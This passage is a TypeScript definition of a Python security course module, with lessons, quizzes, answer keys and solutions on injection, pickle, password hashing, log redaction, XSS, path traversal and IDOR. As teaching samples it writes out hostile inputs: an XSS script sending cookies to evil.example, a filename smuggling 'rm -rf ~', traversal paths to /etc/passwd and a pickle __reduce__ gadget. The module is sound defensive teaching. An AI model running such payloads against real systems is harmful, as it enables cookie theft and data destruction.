import type { PyModuleDef } from "../types";

const r = String.raw;

/** Module 33 — Security in Python. */
export const M33: PyModuleDef = {
  id: "py-security",
  number: 33,
  level: 4,
  title: "Security in Python",
  summary: "Secure coding; input validation; SQL injection; command injection; unsafe deserialisation; secrets management; password hashing; secure file handling; dependency risks; secure logging; authentication and authorisation basics; common web risks (XSS, path traversal, CSRF, IDOR).",
  track: "core",
  prereqs: ["py-databases", "py-apis"],
  lessons: [
    {
      id: "py-untrusted-input",
      title: "Untrusted input: validation and injection",
      minutes: 18,
      difficulty: 4,
      objectives: [
        "Validate input with allow-lists, types and ranges",
        "Avoid SQL, command and code injection",
        "Explain why pickle and eval must never touch untrusted data",
      ],
      warmup: {
        id: "w", kind: "mcq", difficulty: 3,
        prompt: "Which is the safest way to evaluate a user-supplied list like `[1, 2, 3]`?",
        options: [
          { text: "eval(text)", why: "eval runs any Python code — e.g. code that deletes files." },
          { text: "json.loads(text) or ast.literal_eval(text)", why: "Correct: they only parse data." },
          { text: "exec(text)", why: "Even more dangerous." },
        ],
        answer: 1,
        hint: "Parse data; never run it.",
        explain: "json.loads and ast.literal_eval accept literals only; eval/exec execute arbitrary code.",
      },
      why: "Every serious breach starts with a program trusting data it shouldn't: a search box that becomes SQL, a filename that becomes a shell command, an uploaded file that becomes code. The habit that prevents most of them is simple — treat all outside data as hostile until validated, and never let it become code.",
      concept: [
        {
          title: "Validate at the boundary",
          body: `Everything from outside — forms, URLs, files, APIs, environment, even your own database if others write to it — is **untrusted**.

- **Allow-list** what is permitted (\`^[a-z0-9_]{3,20}$\` for usernames) instead of trying to block bad characters.
- Convert to the right **type** and check **ranges** and **lengths** (huge inputs are an attack too).
- Validate once, at the boundary, then pass around trusted typed objects (Module 24).
- Fail **closed**: if in doubt, reject.`,
        },
        {
          title: "Injection: data becoming code",
          body: `| Injection | Dangerous | Safe |
| --- | --- | --- |
| SQL | \`f"... WHERE name = '{name}'"\` | placeholders: \`"... = ?", (name,)\` |
| Shell | \`os.system(f"convert {file}")\`, \`subprocess.run(cmd, shell=True)\` | \`subprocess.run(["convert", file])\` — a list, no shell |
| Python | \`eval(text)\`, \`exec(text)\` | \`json.loads\`, \`ast.literal_eval\` |
| Deserialisation | \`pickle.loads(untrusted)\`, \`yaml.load\` | JSON; \`yaml.safe_load\` |

The rule: **keep data and code separate** so data can never be interpreted as instructions.`,
        },
        {
          title: "Why pickle is dangerous",
          body: `\`pickle\` can rebuild any object — and an object can say "to rebuild me, call this function". So loading a crafted pickle **runs code chosen by its author**. Only unpickle data you created and stored yourself; for anything exchanged with others use JSON.`,
        },
      ],
      example: {
        title: "Validating, then staying safe",
        code: r`import ast, json, pickle, re, shlex

USERNAME = re.compile(r"[a-z0-9_]{3,20}")

def validate_signup(username, age_text):
    errors = []
    if not USERNAME.fullmatch(username):
        errors.append("username: 3-20 lowercase letters, digits or _")
    try:
        age = int(age_text)
        if not 13 <= age <= 120:
            errors.append("age: must be 13-120")
    except ValueError:
        errors.append("age: not a number")
    return errors or "ok"

print(validate_signup("asha_91", "17"))
print(validate_signup("Robert'); DROP TABLE--", "abc"))

filename = "photo.png; rm -rf ~"
print("shell would run:", shlex.split(f"convert {filename} out.jpg")[2:])
print("argument list keeps it whole:", ["convert", filename, "out.jpg"][1])

print(ast.literal_eval("[1, 2, {'a': 3}]"))
try:
    ast.literal_eval("__import__('os').getcwd()")
except ValueError:
    print("literal_eval refused code")

class Sneaky:
    def __reduce__(self):
        return (print, ("!! this ran while UNPICKLING !!",))
blob = pickle.dumps(Sneaky())
pickle.loads(blob)
print(json.loads('{"safe": true}'))`,
        output: "ok\n['username: 3-20 lowercase letters, digits or _', 'age: not a number']\nshell would run: ['rm', '-rf', '~', 'out.jpg']\nargument list keeps it whole: photo.png; rm -rf ~\n[1, 2, {'a': 3}]\nliteral_eval refused code\n!! this ran while UNPICKLING !!\n{'safe': True}\n",
        lines: [
          [3, "An allow-list: describe exactly what IS allowed."],
          [7, "fullmatch requires the whole string to match, not just part of it."],
          [11, "Range check after converting the type."],
          [21, "Through a shell, `;` would end the command and start `rm -rf ~` (shown, not run)."],
          [22, "As a list item with no shell, the whole name is one harmless argument."],
          [24, "literal_eval parses data structures only…"],
          [26, "…and refuses anything that would run code."],
          [32, "__reduce__ tells pickle which function to call when loading — here a harmless print, but it could be anything."],
          [34, "Merely loading the bytes ran the function. Never unpickle untrusted data."],
        ],
      },
      mistakes: [
        { title: "Block-lists", body: "Trying to strip 'bad' characters always misses one. Allow-list what's valid instead." },
        { title: "shell=True with user text", body: "Pass a list of arguments to subprocess and keep shell=False (the default)." },
        { title: "Trusting client-side checks", body: "Browser validation is for convenience; attackers send requests directly. Validate on the server." },
      ],
      questions: [
        {
          id: "p1", kind: "predict", difficulty: 3,
          code: r`import re
ok = re.compile(r"[a-z]{3,8}")
for name in ["asha", "as", "asha1", "ravi;ls"]:
    print(name, bool(ok.fullmatch(name)), bool(ok.match(name)))`,
          answer: "asha True True\nas False False\nasha1 False True\nravi;ls False True\n",
          hint: "match only checks the start; fullmatch checks everything.",
          explain: "match('asha1') succeeds on 'asha' and ignores the rest — a classic validation hole. fullmatch rejects it.",
        },
        {
          id: "f1", kind: "fill", difficulty: 3,
          prompt: "Parse the user's data safely (no code execution).",
          code: r`import ast
text = "(1, 'two', [3])"
value = ast.___(text)
print(value[1], len(value))`,
          blanks: [["literal_eval"]],
          output: "two 3\n",
          hint: "Evaluate literals only.",
          explain: "`ast.literal_eval` accepts strings, numbers, tuples, lists, dicts, sets, booleans and None — nothing executable.",
        },
        {
          id: "b1", kind: "bug", difficulty: 4,
          prompt: "This 'calculator' lets users run any Python code (try `__import__('os')...`). Which line must change?",
          code: r`import ast, operator
OPS = {ast.Add: operator.add, ast.Sub: operator.sub, ast.Mult: operator.mul}
def calc(expr):
    return eval(expr)
def safe(node):
    if isinstance(node, ast.Constant) and isinstance(node.value, (int, float)):
        return node.value
    if isinstance(node, ast.BinOp) and type(node.op) in OPS:
        return OPS[type(node.op)](safe(node.left), safe(node.right))
    raise ValueError("not allowed")
for e in ["2 + 3 * 4", "__import__('os').name"]:
    try:
        print(calc(e))
    except ValueError as err:
        print("rejected:", err)`,
          line: 4,
          fix: r`import ast, operator
OPS = {ast.Add: operator.add, ast.Sub: operator.sub, ast.Mult: operator.mul}
def calc(expr):
    return safe(ast.parse(expr, mode="eval").body)
def safe(node):
    if isinstance(node, ast.Constant) and isinstance(node.value, (int, float)):
        return node.value
    if isinstance(node, ast.BinOp) and type(node.op) in OPS:
        return OPS[type(node.op)](safe(node.left), safe(node.right))
    raise ValueError("not allowed")
for e in ["2 + 3 * 4", "__import__('os').name"]:
    try:
        print(calc(e))
    except ValueError as err:
        print("rejected:", err)`,
          output: "14\nrejected: not allowed\n",
          hint: "The safe evaluator exists but isn't used.",
          explain: "eval runs anything. Parsing to an AST and walking only allowed node types turns code into data you control.",
        },
        {
          id: "m1", kind: "mcq", difficulty: 3,
          prompt: "Your app receives a pickle file from a user's upload. What should you do?",
          options: [
            { text: "pickle.loads it inside try/except", why: "The code runs during loading — try/except can't stop it." },
            { text: "Refuse it; accept JSON (or another data-only format) instead", why: "Correct." },
            { text: "Scan it for the word 'os'", why: "Trivially bypassed." },
          ],
          answer: 1,
          hint: "Loading itself is the danger.",
          explain: "Unpickling untrusted data is equivalent to running untrusted code. Use data-only formats for exchange.",
        },
      ],
      exercises: [
        {
          id: "task", kind: "task", title: "Validate a registration form", difficulty: 3,
          prompt: `Read form lines \`field=value\` until \`end\` and validate with allow-lists:
- \`username\`: 3–20 chars of a–z, 0–9, \`_\`
- \`email\`: exactly one \`@\`, non-empty local part, domain with a dot, no spaces, ≤ 254 chars
- \`age\`: integer 13–120
- \`plan\`: one of \`free\`, \`pro\`
Missing fields count as invalid; unknown fields are reported as \`unexpected field <name>\`. Print each problem as \`<field>: invalid\` (in the order username, email, age, plan, then unexpected fields in input order), or \`valid\`.`,
          starter: r`import re
`,
          tests: [
            { label: "Problems", input: "username=Asha!\nemail=asha@mail\nage=12\nplan=pro\nrole=admin\nend\n", output: "username: invalid\nemail: invalid\nage: invalid\nunexpected field role" },
            { label: "Valid", input: "username=asha_91\nemail=asha@example.in\nage=19\nplan=free\nend\n", output: "valid", hidden: true },
            { label: "Missing", input: "username=ravi\nend\n", output: "email: invalid\nage: invalid\nplan: invalid", hidden: true, category: "edge" },
          ],
          hints: [
            "`key, _, value = line.partition(\"=\")` into a dict; remember unexpected keys.",
            "Write one small check function per field.",
            "Email: `re.fullmatch(r\"[^@\\s]+@[^@\\s]+\\.[^@\\s]+\", v)` plus a length check.",
            "Age: `v.isdigit() and 13 <= int(v) <= 120`.",
          ],
          solution: r`import re

CHECKS = {
    "username": lambda v: re.fullmatch(r"[a-z0-9_]{3,20}", v) is not None,
    "email": lambda v: len(v) <= 254 and re.fullmatch(r"[^@\s]+@[^@\s]+\.[^@\s]+", v) is not None,
    "age": lambda v: v.isdigit() and 13 <= int(v) <= 120,
    "plan": lambda v: v in {"free", "pro"},
}

form = {}
unexpected = []
while (line := input()) != "end":
    key, _, value = line.partition("=")
    if key in CHECKS:
        form[key] = value
    else:
        unexpected.append(key)

problems = [f"{field}: invalid" for field, ok in CHECKS.items() if field not in form or not ok(form[field])]
problems += [f"unexpected field {name}" for name in unexpected]
print("\n".join(problems) if problems else "valid")`,
          notes: "Rejecting unexpected fields stops 'mass assignment' attacks, where someone adds role=admin to a sign-up form and the server blindly saves it.",
        },
        {
          id: "stretch", kind: "task", title: "Safe command builder", difficulty: 4,
          prompt: `A tool converts images by calling an external program — never through a shell. Write \`build_command(filename, width)\` that returns an **argument list** \`["magick", <filename>, "-resize", "<width>x", "out/<stem>.jpg"]\`, after validating: filename matches \`^[\\w\\-. ]{1,64}\\.(png|jpg|jpeg)$\` (case-insensitive) and doesn't start with \`-\` (it would be read as an option), width is an integer 16–4096. Raise ValueError with a message otherwise. Print the list (repr) or \`rejected: <message>\` for each \`filename width\` line (split on the **last** space) until \`end\`. (The sandbox can't start processes; the list is what you'd pass to \`subprocess.run\`.)`,
          starter: r`import re
from pathlib import PurePath
`,
          tests: [
            { label: "Mixed", input: "holiday photo.png 800\nx.png; rm -rf ~ 800\n-rf.png 100\nicon.PNG 8\nlogo.jpeg 1024\nend\n", output: "['magick', 'holiday photo.png', '-resize', '800x', 'out/holiday photo.jpg']\nrejected: bad filename\nrejected: bad filename\nrejected: width must be 16-4096\n['magick', 'logo.jpeg', '-resize', '1024x', 'out/logo.jpg']" },
          ],
          hints: [
            "`name, _, width = line.rpartition(\" \")`.",
            "`re.fullmatch(pattern, name, re.IGNORECASE)` and `name.startswith(\"-\")`.",
            "`PurePath(name).stem` gives the name without extension.",
            "Check width with isdigit() and the range.",
          ],
          solution: r`import re
from pathlib import PurePath

NAME = re.compile(r"[\w\-. ]{1,64}\.(png|jpg|jpeg)", re.IGNORECASE)

def build_command(filename, width):
    if not NAME.fullmatch(filename) or filename.startswith("-"):
        raise ValueError("bad filename")
    if not width.isdigit() or not 16 <= int(width) <= 4096:
        raise ValueError("width must be 16-4096")
    return ["magick", filename, "-resize", f"{int(width)}x", f"out/{PurePath(filename).stem}.jpg"]

while (line := input()) != "end":
    name, _, width = line.rpartition(" ")
    try:
        print(build_command(name, width))
    except ValueError as e:
        print("rejected:", e)`,
          notes: "Two layers: no shell (so `;` and `$()` mean nothing) and strict validation (so a name like `-rf.png` can't be mistaken for an option). Real code would also pass `--` before file arguments where the tool supports it.",
        },
      ],
      realWorld: "OWASP's Top 10 lists injection among the most common web flaws; the 2017 Equifax breach began with untrusted input reaching a vulnerable parser; security reviews check every place user data meets SQL, shells or deserialisers.",
      reteach: "Imagine a bank clerk who reads customer notes aloud as instructions. A note saying 'and give me everyone's money' would be obeyed! Injection is exactly that: data being read as instructions. Placeholders, argument lists and data-only parsers are the clerk's rule: 'notes are only ever read as notes'.",
      summary: [
        "Treat all outside data as untrusted; validate with allow-lists, types, ranges and lengths; fail closed.",
        "Keep data out of code: SQL placeholders, subprocess argument lists without shell, json/literal_eval instead of eval.",
        "Never unpickle (or yaml.load) untrusted data — loading can execute code.",
      ],
    },

    {
      id: "py-secrets-passwords",
      title: "Secrets, password hashing and secure logging",
      minutes: 17,
      difficulty: 4,
      objectives: [
        "Generate tokens with `secrets` and keep secrets out of code",
        "Store passwords as salted, slow hashes and verify them safely",
        "Log useful information without leaking sensitive data",
      ],
      warmup: {
        id: "w", kind: "mcq", difficulty: 3,
        prompt: "How should a website store users' passwords?",
        options: [
          { text: "Encrypted, so admins can decrypt them if needed", why: "Anyone with the key can recover every password." },
          { text: "As salted, deliberately slow hashes (bcrypt, scrypt, argon2, PBKDF2)", why: "Correct." },
          { text: "As a fast SHA-256 hash", why: "Fast hashes can be brute-forced billions of times per second." },
        ],
        answer: 1,
        hint: "Nobody — not even you — should be able to get the password back.",
        explain: "Hashing is one-way. A unique salt defeats precomputed tables; a slow algorithm makes guessing expensive.",
      },
      why: "Leaked password databases, API keys pushed to GitHub and tokens printed in logs cause real breaches every week. Python's standard library already has everything needed to avoid them — you just have to use it.",
      concept: [
        {
          title: "Randomness for security",
          body: `\`random\` is predictable (designed for simulations). For tokens, reset links, API keys and session ids use **\`secrets\`**:

\`\`\`python
import secrets
secrets.token_urlsafe(32)   # URL-safe random token (~43 characters)
secrets.token_hex(16)        # 32 hex characters
secrets.choice(alphabet)     # secure random choice
\`\`\``,
        },
        {
          title: "Password hashing",
          body: `\`\`\`python
salt = secrets.token_bytes(16)                      # unique per user, stored with the hash
digest = hashlib.pbkdf2_hmac("sha256", pw.encode(), salt, 600_000)
# verify: recompute with the stored salt and compare in constant time
hmac.compare_digest(recomputed, stored)
\`\`\`

- Store \`algorithm$iterations$salt$hash\` so you can raise the cost later.
- \`hashlib.scrypt\` is also in the standard library; libraries like **argon2-cffi** and **bcrypt** are popular choices.
- Never invent your own scheme; never log or email passwords.`,
        },
        {
          title: "Secrets and logging",
          body: `- Secrets come from **environment variables or a secrets manager**, never source code or git.
- \`.env\` files belong in \`.gitignore\`; rotate any key that leaked.
- **Log events, not secrets**: user id yes, password/token/card number/Aadhaar no. Mask (\`****1234\`) or redact before logging.
- Error pages shown to users must not include stack traces, SQL or keys.`,
        },
      ],
      example: {
        title: "Hashing passwords and redacting logs",
        code: r`import hashlib, hmac, logging, re, secrets, sys

ITERATIONS = 100_000

def hash_password(password, salt=None):
    salt = salt or secrets.token_bytes(16)
    digest = hashlib.pbkdf2_hmac("sha256", password.encode(), salt, ITERATIONS)
    return "$".join(["pbkdf2_sha256", str(ITERATIONS), salt.hex(), digest.hex()])

def verify_password(password, stored):
    algo, iterations, salt_hex, digest_hex = stored.split("$")
    candidate = hashlib.pbkdf2_hmac("sha256", password.encode(), bytes.fromhex(salt_hex), int(iterations))
    return hmac.compare_digest(candidate.hex(), digest_hex)

a = hash_password("monsoon-2026")
b = hash_password("monsoon-2026")
print("same password, different hashes:", a != b)
print("verify right:", verify_password("monsoon-2026", a), "| wrong:", verify_password("monsoon-2025", a))
print("token length:", len(secrets.token_urlsafe(32)))

SENSITIVE = re.compile(r"(password|token|api_key)=\S+", re.IGNORECASE)
class Redact(logging.Filter):
    def filter(self, record):
        record.msg = SENSITIVE.sub(lambda m: m.group(1) + "=[REDACTED]", str(record.msg))
        return True

log = logging.getLogger("app")
handler = logging.StreamHandler(sys.stdout)
handler.setFormatter(logging.Formatter("%(levelname)s %(message)s"))
handler.addFilter(Redact())
log.addHandler(handler)
log.setLevel(logging.INFO)
log.info("login user=asha password=monsoon-2026 ip=10.0.0.7")
log.warning("retrying call with api_key=sk_live_abc123")`,
        output: "same password, different hashes: True\nverify right: True | wrong: False\ntoken length: 43\nINFO login user=asha password=[REDACTED] ip=10.0.0.7\nWARNING retrying call with api_key=[REDACTED]\n",
        lines: [
          [3, "Iterations make each guess slow; real systems use hundreds of thousands."],
          [6, "A fresh random salt per password, from the secrets module."],
          [8, "Store the algorithm, cost and salt next to the hash."],
          [12, "Verification recomputes the hash with the stored salt and cost…"],
          [13, "…and compares in constant time."],
          [17, "Salts make identical passwords produce different hashes."],
          [22, "A logging filter redacts secrets before anything is written."],
          [33, "The log line keeps the useful facts and hides the password."],
        ],
      },
      mistakes: [
        { title: "Using random for tokens", body: "random's sequence can be predicted from its outputs. Use secrets." },
        { title: "Fast or unsalted hashes", body: "md5/sha256(password) can be cracked at enormous speed and with precomputed tables. Use a salted, slow KDF." },
        { title: "Secrets in logs and errors", body: "Logs are copied to many systems and kept for years. Redact before logging; show users generic error messages." },
      ],
      questions: [
        {
          id: "p1", kind: "predict", difficulty: 3,
          code: r`import hashlib
salt1, salt2 = b"aaaa", b"bbbb"
h1 = hashlib.pbkdf2_hmac("sha256", b"pw", salt1, 1000)
h2 = hashlib.pbkdf2_hmac("sha256", b"pw", salt2, 1000)
h3 = hashlib.pbkdf2_hmac("sha256", b"pw", salt1, 1000)
print(h1 == h2, h1 == h3, len(h1))`,
          answer: "False True 32\n",
          hint: "Same password + same salt + same cost → same hash.",
          explain: "Different salts give different hashes; identical inputs reproduce the hash (that's how verification works). SHA-256 output is 32 bytes.",
        },
        {
          id: "f1", kind: "fill", difficulty: 3,
          prompt: "Generate an unguessable password-reset token.",
          code: r`import secrets
token = secrets.___(16)
print(len(token))`,
          blanks: [["token_hex"]],
          output: "32\n",
          hint: "16 random bytes shown as hexadecimal.",
          explain: "`secrets.token_hex(16)` returns 32 hex characters from a cryptographically secure source.",
        },
        {
          id: "b1", kind: "bug", difficulty: 4,
          prompt: "This hashes passwords without a salt, so two users with the same password get the same hash (and rainbow tables work). Which line should add a per-user salt?",
          code: r`import hashlib
def hash_pw(pw, salt):
    return hashlib.pbkdf2_hmac("sha256", pw.encode(), b"", 1000).hex()
users = {"asha": ("tiger", b"s-asha"), "ravi": ("tiger", b"s-ravi")}
hashes = {u: hash_pw(pw, salt) for u, (pw, salt) in users.items()}
print("identical hashes:", hashes["asha"] == hashes["ravi"])`,
          line: 3,
          fix: r`import hashlib
def hash_pw(pw, salt):
    return hashlib.pbkdf2_hmac("sha256", pw.encode(), salt, 1000).hex()
users = {"asha": ("tiger", b"s-asha"), "ravi": ("tiger", b"s-ravi")}
hashes = {u: hash_pw(pw, salt) for u, (pw, salt) in users.items()}
print("identical hashes:", hashes["asha"] == hashes["ravi"])`,
          output: "identical hashes: False\n",
          hint: "The salt parameter is ignored.",
          explain: "Passing the user's salt makes each hash unique, so cracking one doesn't crack every account with the same password. (Real salts come from secrets.token_bytes.)",
        },
        {
          id: "m1", kind: "mcq", difficulty: 3,
          prompt: "You accidentally pushed an API key to a public GitHub repo, then deleted the commit an hour later. What now?",
          options: [
            { text: "Nothing — it's deleted", why: "Bots scan GitHub in seconds; forks and caches keep copies." },
            { text: "Revoke/rotate the key immediately and check usage logs", why: "Correct." },
            { text: "Make the repository private", why: "Doesn't un-leak the key." },
          ],
          answer: 1,
          hint: "Assume it's already copied.",
          explain: "Treat any leaked secret as compromised: rotate it, review logs for misuse, then add secret scanning to stop repeats.",
        },
      ],
      exercises: [
        {
          id: "task", kind: "task", title: "Password policy and storage", difficulty: 3,
          prompt: `Read \`username password\` lines until \`end\`. Reject weak passwords with the first failing rule: \`too short\` (< 10 chars), \`too common\` (in the given COMMON set, case-insensitive), \`contains username\` (case-insensitive). Otherwise store a PBKDF2 hash (fixed salt \`username.encode()\` here so tests are repeatable; real code uses random salts) and print \`stored <username>\`. Then read \`login username password\` lines until \`done\` and print \`ok\` or \`denied\` (unknown users too).`,
          starter: r`import hashlib, hmac

COMMON = {"password123", "qwerty12345", "iloveindia1", "1234567890"}
`,
          tests: [
            { label: "Signup + login", input: "asha correct-horse-battery\nravi Password123\nmeera meera2026xyz\nzoe short\nend\nlogin asha correct-horse-battery\nlogin asha Correct-horse-battery\nlogin ravi Password123\ndone\n", output: "stored asha\nravi: too common\nmeera: contains username\nzoe: too short\nok\ndenied\ndenied" },
          ],
          hints: [
            "Check rules in order and print `<user>: <reason>`.",
            "`hashlib.pbkdf2_hmac(\"sha256\", pw.encode(), user.encode(), 50_000)`.",
            "Store hashes in a dict; for login, recompute and compare with hmac.compare_digest.",
            "Unknown user → denied (don't reveal which part was wrong).",
          ],
          solution: r`import hashlib, hmac

COMMON = {"password123", "qwerty12345", "iloveindia1", "1234567890"}

def kdf(user, pw):
    return hashlib.pbkdf2_hmac("sha256", pw.encode(), user.encode(), 50_000)

def problem(user, pw):
    if len(pw) < 10:
        return "too short"
    if pw.lower() in COMMON:
        return "too common"
    if user.lower() in pw.lower():
        return "contains username"
    return None

stored = {}
while (line := input()) != "end":
    user, pw = line.split(" ", 1)
    reason = problem(user, pw)
    if reason:
        print(f"{user}: {reason}")
    else:
        stored[user] = kdf(user, pw)
        print("stored", user)

while (line := input()) != "done":
    _, user, pw = line.split(" ", 2)
    ok = user in stored and hmac.compare_digest(kdf(user, pw), stored[user])
    print("ok" if ok else "denied")`,
          notes: "Login says only 'denied' whether the user or the password is wrong — distinct messages let attackers discover which accounts exist. Production systems add random salts, rate limiting and breached-password checks.",
        },
        {
          id: "stretch", kind: "task", title: "Log redactor", difficulty: 4,
          prompt: `Read log lines until \`end\` and print them redacted:
- \`password=…\`, \`token=…\`, \`secret=…\` values → \`[REDACTED]\` (key kept, case-insensitive)
- \`Authorization: Bearer <token>\` → \`Authorization: Bearer [REDACTED]\`
- 16-digit card numbers (optionally grouped by spaces or dashes in 4s) → \`**** **** **** <last 4>\`
- email addresses → first character + \`***@\` + domain
Then print \`redactions: N\` (total replacements).`,
          starter: r`import re
`,
          tests: [
            { label: "Logs", input: "login user=asha Password=hunter2 ok\nGET /me Authorization: Bearer eyJhbGciOi.abc\npaid with 4111 1111 1111 1234 by ravi@example.com\nnothing secret here\nend\n", output: "login user=asha Password=[REDACTED] ok\nGET /me Authorization: Bearer [REDACTED]\npaid with **** **** **** 1234 by r***@example.com\nnothing secret here\nredactions: 4" },
          ],
          hints: [
            "Use re.subn — it returns (new_text, count).",
            "Keys: `(password|token|secret)=\\S+` with re.IGNORECASE and a replacement that keeps group 1.",
            "Cards: `\\b(?:\\d{4}[ -]?){3}(\\d{4})\\b`.",
            "Emails: `\\b([\\w.+-])[\\w.+-]*@([\\w-]+\\.[\\w.-]+)`.",
          ],
          solution: r`import re

RULES = [
    (re.compile(r"(password|token|secret)=\S+", re.IGNORECASE), lambda m: f"{m.group(1)}=[REDACTED]"),
    (re.compile(r"(Authorization: Bearer )\S+"), lambda m: f"{m.group(1)}[REDACTED]"),
    (re.compile(r"\b(?:\d{4}[ -]?){3}(\d{4})\b"), lambda m: f"**** **** **** {m.group(1)}"),
    (re.compile(r"\b([\w.+-])[\w.+-]*@([\w-]+\.[\w.-]+)"), lambda m: f"{m.group(1)}***@{m.group(2)}"),
]

total = 0
while (line := input()) != "end":
    for pattern, repl in RULES:
        line, n = pattern.subn(repl, line)
        total += n
    print(line)
print("redactions:", total)`,
          notes: "Redaction is a safety net, not a licence to log secrets — the best fix is never passing them to the logger. Regexes will miss formats you didn't think of, so also restrict who can read logs.",
        },
      ],
      realWorld: "Django stores passwords as `pbkdf2_sha256$iterations$salt$hash`; GitHub secret scanning revokes leaked cloud keys automatically; PCI-DSS forbids logging full card numbers.",
      reteach: "A password hash is like a meat grinder: easy to turn a steak into mince, impossible to turn mince back into the steak. The salt is a secret spice different for each customer, so two identical steaks make different mince. A slow grinder means a thief trying millions of steaks takes years.",
      summary: [
        "Use `secrets` for tokens; keep keys in env vars/secret managers; rotate leaked keys.",
        "Passwords: unique random salt + slow KDF (PBKDF2/scrypt/argon2/bcrypt); verify with compare_digest.",
        "Log events not secrets; redact or mask sensitive fields; show users generic errors.",
      ],
      libraryCode: [{
        title: "argon2 password hashing",
        code: `from argon2 import PasswordHasher

ph = PasswordHasher()
stored = ph.hash("correct-horse-battery")
ph.verify(stored, "correct-horse-battery")     # raises VerifyMismatchError if wrong
if ph.check_needs_rehash(stored):
    stored = ph.hash("correct-horse-battery")   # upgrade cost on next login`,
        note: "`pip install argon2-cffi` on your own computer. Argon2id is the current recommendation of OWASP for new systems.",
      }],
    },

    {
      id: "py-web-security",
      title: "Web risks: XSS, path traversal, access control",
      minutes: 18,
      difficulty: 4,
      objectives: [
        "Escape output to prevent cross-site scripting (XSS)",
        "Stop path traversal in file handling",
        "Distinguish authentication from authorisation and prevent IDOR",
      ],
      warmup: {
        id: "w", kind: "mcq", difficulty: 3,
        prompt: "A download URL is `/files?name=report.pdf`. An attacker requests `name=../../etc/passwd`. This attack is called…",
        options: [
          { text: "SQL injection", why: "No SQL involved." },
          { text: "Path traversal", why: "Correct." },
          { text: "Cross-site scripting", why: "XSS injects scripts into pages." },
        ],
        answer: 1,
        hint: "`..` walks up the folder tree.",
        explain: "Path traversal uses `..` (or absolute paths) to escape the intended folder and read other files.",
      },
      why: "Most Python code eventually sits behind a website or API. A comment box that runs attackers' JavaScript, a download link that serves any file on the server, or a URL where changing `/orders/41` to `/orders/42` shows someone else's order — these are everyday bugs with serious consequences.",
      concept: [
        {
          title: "XSS: escape output",
          body: `If user text is put into HTML unescaped, \`<script>…</script>\` in a comment runs in every visitor's browser (stealing sessions, defacing pages).

\`\`\`python
import html
html.escape('<script>alert(1)</script>')   # '&lt;script&gt;alert(1)&lt;/script&gt;'
\`\`\`

Template engines (Jinja2, Django templates) escape automatically — don't switch it off with \`|safe\` / \`Markup\` for user content. Also set a Content-Security-Policy header.`,
        },
        {
          title: "Path traversal: resolve and check",
          body: `\`\`\`python
BASE = Path("uploads").resolve()
target = (BASE / user_name).resolve()
if not target.is_relative_to(BASE):     # Python 3.9+
    raise PermissionError("outside uploads")
\`\`\`

Better still: don't use user-supplied names on disk at all — store files under generated ids and keep the original name in the database. Limit upload sizes and check file types by content, not just extension.`,
        },
        {
          title: "Authentication vs authorisation",
          body: `- **Authentication**: who are you? (login, tokens)
- **Authorisation**: are you allowed to do *this*, to *this* object?

**IDOR** (insecure direct object reference): the app checks you're logged in but not that order 42 is *yours*. Every data access must check ownership or role on the server.

**CSRF**: another site makes your logged-in browser submit a form to your app. Defences: CSRF tokens (frameworks provide them) and \`SameSite\` cookies. Add **rate limiting** to login and expensive endpoints.`,
        },
      ],
      example: {
        title: "Escaping, safe paths and ownership checks",
        code: r`import html
from pathlib import Path, PurePosixPath

comment = 'Nice post!<script>fetch("https://evil.example/?c=" + document.cookie)</script>'
print("<p>" + html.escape(comment) + "</p>")

BASE = PurePosixPath("/srv/app/uploads")

def safe_path(name):
    parts = []
    for piece in PurePosixPath(name).parts:
        if piece == "..":
            if not parts:
                raise PermissionError(f"blocked: {name}")
            parts.pop()
        elif piece not in ("/", "."):
            parts.append(piece)
    return BASE.joinpath(*parts)

for name in ["report.pdf", "2026/notes.txt", "../../etc/passwd", "/etc/shadow", "a/../b.txt"]:
    try:
        print("serve", safe_path(name))
    except PermissionError as e:
        print(e)

ORDERS = {41: {"owner": "asha", "total": 499}, 42: {"owner": "ravi", "total": 1299}}

def get_order(current_user, order_id):
    order = ORDERS.get(order_id)
    if order is None or order["owner"] != current_user:
        return 404, None
    return 200, order

print(get_order("asha", 41))
print(get_order("asha", 42))`,
        output: "<p>Nice post!&lt;script&gt;fetch(&quot;https://evil.example/?c=&quot; + document.cookie)&lt;/script&gt;</p>\nserve /srv/app/uploads/report.pdf\nserve /srv/app/uploads/2026/notes.txt\nblocked: ../../etc/passwd\nserve /srv/app/uploads/etc/shadow\nserve /srv/app/uploads/b.txt\n(200, {'owner': 'asha', 'total': 499})\n(404, None)\n",
        lines: [
          [5, "html.escape turns < > & \" into entities, so the browser shows the script as text instead of running it."],
          [7, "PurePosixPath works on path text only — no real files are touched here."],
          [13, "A `..` that would climb above the base folder is refused."],
          [16, "A leading `/` is dropped, so absolute paths stay inside the base too."],
          [18, "The final path is always built from the base."],
          [30, "Authorisation: the order must belong to the logged-in user."],
          [31, "Answer 404 (not 403) so attackers can't even learn that order 42 exists."],
          [35, "Asha is logged in, but order 42 isn't hers."],
        ],
      },
      mistakes: [
        { title: "Escaping input instead of output", body: "Store the original text; escape for the place it's used (HTML, SQL params, shell list). One escaping scheme doesn't fit all contexts." },
        { title: "Checking `'..' in name` only", body: "Attackers use absolute paths, URL-encoding (%2e%2e) and symlinks. Resolve the final path and check it's inside the base." },
        { title: "Hiding links instead of checking access", body: "A button not shown in the UI can still be requested directly. Check permissions on the server for every request." },
      ],
      questions: [
        {
          id: "p1", kind: "predict", difficulty: 3,
          code: r`import html
name = 'Tom & "Jerry" <b>'
print(html.escape(name))
print(html.escape(name, quote=False))`,
          answer: "Tom &amp; &quot;Jerry&quot; &lt;b&gt;\nTom &amp; \"Jerry\" &lt;b&gt;\n",
          hint: "quote=False leaves double quotes alone.",
          explain: "& < > always become entities; quotes are escaped too unless quote=False (needed inside HTML attributes, so keep the default).",
        },
        {
          id: "f1", kind: "fill", difficulty: 3,
          prompt: "Check that the resolved path stays inside the base folder (Python 3.9+).",
          code: r`from pathlib import PurePosixPath
base = PurePosixPath("/srv/uploads")
inside = PurePosixPath("/srv/uploads/a/b.txt")
outside = PurePosixPath("/srv/secrets.txt")
print(inside.___(base), outside.is_relative_to(base))`,
          blanks: [["is_relative_to"]],
          output: "True False\n",
          hint: "Is it relative to the base?",
          explain: "`path.is_relative_to(base)` is True only for paths under base.",
        },
        {
          id: "b1", kind: "bug", difficulty: 4,
          prompt: "Any logged-in user can view any invoice by changing the id (IDOR). Which line must also check ownership?",
          code: r`INVOICES = {1: {"owner": "asha", "amount": 900}, 2: {"owner": "ravi", "amount": 450}}
def view_invoice(user, invoice_id):
    invoice = INVOICES.get(invoice_id)
    if invoice is None:
        return "404"
    return f"{invoice['amount']}"
